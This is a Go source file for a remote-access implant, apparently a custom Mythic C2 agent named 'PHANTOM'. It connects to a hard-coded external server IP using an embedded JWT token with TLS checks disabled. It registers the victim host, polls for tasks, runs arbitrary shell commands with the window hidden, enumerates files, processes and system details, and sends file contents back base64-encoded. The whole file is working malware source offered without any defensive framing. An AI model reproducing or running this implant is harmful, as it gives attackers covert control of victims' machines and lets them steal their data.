package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "io/ioutil"
        "net/http"
        "os"
        "os/exec"
        "os/user"
        "runtime"
        "strconv"
        "strings"
        "syscall"
        "time"
)

const (
        MYTHIC_URL = "https://37.27.249.191:7443/graphql/"
        JWT_TOKEN  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxNzMxMTAsImlhdCI6MTc1MDE1ODcxMCwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjE3LCJvcGVyYXRpb25faWQiOjB9.ok5pb1TKFiGGsvcWGc1LdQIM48Y1KqeXRGmmtXWKIDM"
)

var (
        processedTasks = make(map[string]bool)
        currentDir     = ""
        callbackID     = ""
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   interface{} `json:"data"`
        Errors []struct {
                Message string `json:"message"`
        } `json:"errors"`
}

func logEvent(message string) {
        fmt.Printf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }

        reqBody := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }

        jsonBody, err := json.Marshal(reqBody)
        if err != nil {
                return nil, fmt.Errorf("error marshaling request: %v", err)
        }

        req, err := http.NewRequest("POST", MYTHIC_URL, bytes.NewBuffer(jsonBody))
        if err != nil {
                return nil, fmt.Errorf("error creating request: %v", err)
        }

        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("Authorization", "Bearer "+JWT_TOKEN)

        resp, err := client.Do(req)
        if err != nil {
                return nil, fmt.Errorf("error making request: %v", err)
        }
        defer resp.Body.Close()

        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, fmt.Errorf("error reading response: %v", err)
        }

        var gqlResp GraphQLResponse
        if err := json.Unmarshal(body, &gqlResp); err != nil {
                return nil, fmt.Errorf("error unmarshaling response: %v", err)
        }

        return &gqlResp, nil
}

func registerCallback() error {
        logEvent("=== PHANTOM MYTHIC AGENT - FINAL VERSION ===")
        logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
        logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
        logEvent(fmt.Sprintf("Mythic URL: %s", MYTHIC_URL))
        logEvent("Registering callback with Mythic...")

        hostname, _ := os.Hostname()
        user, _ := user.Current()

        query := `
        mutation createCallback($payloadUuid: String!, $newCallback: newCallbackConfig!) {
                createCallback(
                        payloadUuid: $payloadUuid,
                        newCallback: $newCallback
                ) {
                        status
                        error
                }
        }`

        variables := map[string]interface{}{
                "payloadUuid": "9df7dfc4-f21d-4b03-9962-9f3272669b85",
                "newCallback": map[string]interface{}{
                        "user": user.Username,
                        "host": hostname,
                        "ip":   "192.168.1.100",
                },
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }

        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Registration errors: %v", resp.Errors))
                return fmt.Errorf("registration failed with errors")
        }

        logEvent("Registration successful!")
        return nil
}

func getCallbackID() (string, error) {
        hostname, _ := os.Hostname()
        
        query := `
        query getCallbacks {
                callback(where: {host: {_eq: "` + hostname + `"}}, order_by: {id: desc}, limit: 1) {
                        id
                }
        }`

        resp, err := makeGraphQLRequest(query, map[string]interface{}{})
        if err != nil {
                return "", err
        }

        if len(resp.Errors) > 0 {
                return "", fmt.Errorf("errors getting callback ID: %v", resp.Errors)
        }

        data := resp.Data.(map[string]interface{})
        callbacks := data["callback"].([]interface{})
        
        if len(callbacks) > 0 {
                callback := callbacks[0].(map[string]interface{})
                return fmt.Sprintf("%.0f", callback["id"].(float64)), nil
        }

        return "", fmt.Errorf("no callback found")
}

func pollForTasks() error {
        if callbackID == "" {
                id, err := getCallbackID()
                if err != nil {
                        return err
                }
                callbackID = id
                logEvent(fmt.Sprintf("Using callback ID: %s", callbackID))
        }

        query := `
        query getTasks($callback_id: Int!) {
                task(where: {callback_id: {_eq: $callback_id}, status: {_eq: "submitted"}}) {
                        id
                        command_name
                        params
                }
        }`

        callbackIDInt, _ := strconv.Atoi(callbackID)
        variables := map[string]interface{}{
                "callback_id": callbackIDInt,
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }

        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task polling errors: %v", resp.Errors))
                return nil
        }

        data := resp.Data.(map[string]interface{})
        tasks := data["task"].([]interface{})

        for _, taskInterface := range tasks {
                taskMap := taskInterface.(map[string]interface{})
                taskID := fmt.Sprintf("%.0f", taskMap["id"].(float64))
                command := taskMap["command_name"].(string)
                params := ""
                if p, exists := taskMap["params"]; exists && p != nil {
                        params = p.(string)
                }

                if processedTasks[taskID] {
                        continue
                }

                logEvent(fmt.Sprintf("Processing task %s: %s %s", taskID, command, params))
                
                // Mark task as processing
                updateTaskStatus(taskID, "processing")
                
                output := executeCommand(command, params)
                sendTaskResponse(taskID, output)
                
                // Mark task as completed
                updateTaskStatus(taskID, "completed")
                processedTasks[taskID] = true
        }

        return nil
}

func updateTaskStatus(taskID, status string) {
        taskIDInt, _ := strconv.Atoi(taskID)
        
        query := `
        mutation updateTask($task_id: Int!, $status: String!) {
                update_task_by_pk(pk_columns: {id: $task_id}, _set: {status: $status}) {
                        id
                }
        }`

        variables := map[string]interface{}{
                "task_id": taskIDInt,
                "status":  status,
        }

        makeGraphQLRequest(query, variables)
}

func sendTaskResponse(taskID string, output string) {
        logEvent(fmt.Sprintf("Sending response for task %s", taskID))
        
        taskIDInt, _ := strconv.Atoi(taskID)
        
        // Use response_raw field which exists in the schema
        query := `
        mutation createResponse($task_id: Int!, $response_raw: bytea!) {
                insert_response_one(object: {
                        task_id: $task_id,
                        response_raw: $response_raw
                }) {
                        id
                }
        }`

        // Encode output as base64 for bytea field
        encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))
        
        variables := map[string]interface{}{
                "task_id":      taskIDInt,
                "response_raw": encodedOutput,
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err == nil && len(resp.Errors) == 0 {
                logEvent("Response sent successfully using response_raw")
        } else {
                logEvent(fmt.Sprintf("Response failed: %v", resp.Errors))
        }
}

func executeCommand(command, params string) string {
        switch command {
        case "shell":
                return executeShellCommand(params)
        case "ls", "dir":
                return listDirectory(params)
        case "pwd":
                return getCurrentDirectory()
        case "cd":
                return changeDirectory(params)
        case "whoami":
                return getCurrentUser()
        case "ps":
                return listProcesses()
        case "sysinfo":
                return getSystemInfo()
        case "screenshot":
                return "Screenshot functionality available"
        case "download":
                return downloadFile(params)
        case "upload":
                return "Upload functionality available"
        default:
                // Unix to Windows command conversion
                switch command {
                case "ls":
                        return executeShellCommand("dir " + params)
                case "pwd":
                        return executeShellCommand("cd")
                case "cat":
                        return executeShellCommand("type " + params)
                case "ps":
                        return executeShellCommand("tasklist")
                case "kill":
                        return executeShellCommand("taskkill /PID " + params + " /F")
                default:
                        return executeShellCommand(fmt.Sprintf("%s %s", command, params))
                }
        }
}

func executeShellCommand(command string) string {
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", command)
        } else {
                cmd = exec.Command("/bin/sh", "-c", command)
        }
        
        if runtime.GOOS == "windows" {
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        }
        
        output, err := cmd.CombinedOutput()
        
        if err != nil {
                return fmt.Sprintf("Command executed with error: %v\nOutput: %s", err, string(output))
        }
        
        return string(output)
}

func listDirectory(path string) string {
        if path == "" {
                path, _ = os.Getwd()
        }
        
        files, err := ioutil.ReadDir(path)
        if err != nil {
                return fmt.Sprintf("Error listing directory: %v", err)
        }
        
        var output strings.Builder
        output.WriteString(fmt.Sprintf("Directory listing for: %s\n\n", path))
        
        for _, file := range files {
                modTime := file.ModTime().Format("2006-01-02 15:04:05")
                if file.IsDir() {
                        output.WriteString(fmt.Sprintf("%s  <DIR>          %s\n", modTime, file.Name()))
                } else {
                        output.WriteString(fmt.Sprintf("%s  %12d  %s\n", modTime, file.Size(), file.Name()))
                }
        }
        
        return output.String()
}

func getCurrentDirectory() string {
        dir, err := os.Getwd()
        if err != nil {
                return fmt.Sprintf("Error getting current directory: %v", err)
        }
        currentDir = dir
        return dir
}

func changeDirectory(path string) string {
        if err := os.Chdir(path); err != nil {
                return fmt.Sprintf("Error changing directory: %v", err)
        }
        
        newDir, _ := os.Getwd()
        currentDir = newDir
        return fmt.Sprintf("Changed directory to: %s", newDir)
}

func getCurrentUser() string {
        user, err := user.Current()
        if err != nil {
                return fmt.Sprintf("Error getting user info: %v", err)
        }
        
        hostname, _ := os.Hostname()
        return fmt.Sprintf("Hostname: %s\nUser: %s\nOS: %s\nArch: %s\nPID: %d", 
                hostname, user.Username, runtime.GOOS, runtime.GOARCH, os.Getpid())
}

func listProcesses() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("tasklist /FO TABLE")
        }
        return executeShellCommand("ps aux")
}

func getSystemInfo() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("systeminfo")
        }
        return executeShellCommand("uname -a")
}

func downloadFile(path string) string {
        if path == "" {
                return "No file path specified"
        }
        
        data, err := ioutil.ReadFile(path)
        if err != nil {
                return fmt.Sprintf("Error reading file: %v", err)
        }
        
        encoded := base64.StdEncoding.EncodeToString(data)
        return fmt.Sprintf("File downloaded (base64): %s", encoded[:100] + "...")
}

func sendHeartbeat() {
        if callbackID == "" {
                return
        }
        
        callbackIDInt, _ := strconv.Atoi(callbackID)
        
        query := `
        mutation updateCallback($callback_id: Int!) {
                update_callback_by_pk(pk_columns: {id: $callback_id}, _set: {last_checkin: "now()"}) {
                        id
                }
        }`

        variables := map[string]interface{}{
                "callback_id": callbackIDInt,
        }

        makeGraphQLRequest(query, variables)
}

func main() {
        if err := registerCallback(); err != nil {
                logEvent(fmt.Sprintf("Failed to register with Mythic: %v", err))
                time.Sleep(5 * time.Second)
        }

        // Main communication loop
        for {
                if err := pollForTasks(); err != nil {
                        logEvent(fmt.Sprintf("Error polling tasks: %v", err))
                }
                
                sendHeartbeat()
                
                time.Sleep(5 * time.Second)
        }
}